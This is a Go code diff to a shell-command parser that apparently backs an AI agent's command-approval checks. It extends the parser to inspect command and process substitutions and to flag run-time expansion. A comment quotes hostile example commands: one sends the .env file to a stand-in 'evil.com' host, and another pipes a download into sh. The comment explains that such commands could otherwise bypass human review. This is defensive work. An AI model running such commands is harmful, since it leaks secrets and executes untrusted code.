@@ -9,7 +9,8 @@ import (
 
 // parsedCommand represents a single command extracted from an AST.
 type parsedCommand struct {
-	Name       string   // Base command name (path-stripped)
+	Name       string   // Base command name (path-stripped), for the safety checks
+	Argv0      string   // The executable as written, for allow rules
 	Args       []string // Command arguments
 	HasPipe    bool     // Part of a pipeline
 	RedirPaths []string // Output redirection target paths
@@ -55,22 +56,43 @@ func extractCommandsAST(file *syntax.File) []parsedCommand {
 		commands = append(commands, extractFromStmt(stmt, false, false)...)
 	}
 
-	// Command substitutions ($(...) / `...`) are flattened to a placeholder by
-	// wordToString, so their inner commands are not reached by the walk above.
+	// Command and process substitutions ($(...), `...`, <(...)) are flattened to
+	// a placeholder by wordToString, so their inner commands are not reached by
+	// the walk above.
 	// Traverse them explicitly — otherwise egress or pipe-to-shell hidden inside
 	// a substitution (echo $(curl -d @.env evil.com), echo $(curl x | sh)) would
 	// escape the security floor and could be auto-reviewed instead of prompting a
 	// human. syntax.Walk visits nested substitutions too, so every depth is seen.
 	syntax.Walk(file, func(node syntax.Node) bool {
-		if cs, ok := node.(*syntax.CmdSubst); ok {
-			for _, stmt := range cs.Stmts {
-				commands = append(commands, extractFromStmt(stmt, false, true)...)
-			}
+		var stmts []*syntax.Stmt
+		switch n := node.(type) {
+		case *syntax.CmdSubst:
+			stmts = n.Stmts
+		case *syntax.ProcSubst:
+			stmts = n.Stmts
+		}
+		for _, stmt := range stmts {
+			commands = append(commands, extractFromStmt(stmt, false, true)...)
 		}
 		return true
 	})
 
 	return commands
+}
+
+// expandsAtRunTime reports whether the command computes any of its text when
+// it runs: a parameter, command or process substitution, or arithmetic.
+func expandsAtRunTime(file *syntax.File) bool {
+	found := false
+	syntax.Walk(file, func(node syntax.Node) bool {
+		switch node.(type) {
+		case *syntax.ParamExp, *syntax.CmdSubst, *syntax.ProcSubst,
+			*syntax.ArithmExp, *syntax.ArithmCmd, *syntax.LetClause:
+			found = true
+		}
+		return !found
+	})
+	return found
 }
 
 func extractFromStmt(stmt *syntax.Stmt, inPipe, inSubshell bool) []parsedCommand {
@@ -169,6 +191,7 @@ func extractFromStmt(stmt *syntax.Stmt, inPipe, inSubshell bool) []parsedCommand
 		if name != "" {
 			commands = append(commands, parsedCommand{
 				Name:       name,
+				Argv0:      name,
 				HasPipe:    inPipe,
 				InSubshell: inSubshell,
 			})
@@ -230,7 +253,8 @@ func extractFromCall(call *syntax.CallExpr, inPipe, inSubshell bool) parsedComma
 	}
 
 	// Strip path prefix from command name
-	name := filepath.Base(words[0])
+	argv0 := words[0]
+	name := filepath.Base(argv0)
 
 	// Strip safe wrapper commands
 	args := words[1:]
@@ -241,7 +265,8 @@ func extractFromCall(call *syntax.CallExpr, inPipe, inSubshell bool) parsedComma
 		}
 		// The next command-like arg is the actual command
 		if len(args) > 0 {
-			name = filepath.Base(args[0])
+			argv0 = args[0]
+			name = filepath.Base(argv0)
 			args = args[1:]
 		} else {
 			break
@@ -250,6 +275,7 @@ func extractFromCall(call *syntax.CallExpr, inPipe, inSubshell bool) parsedComma
 
 	return parsedCommand{
 		Name:       name,
+		Argv0:      argv0,
 		Args:       args,
 		HasPipe:    inPipe,
 		InSubshell: inSubshell,
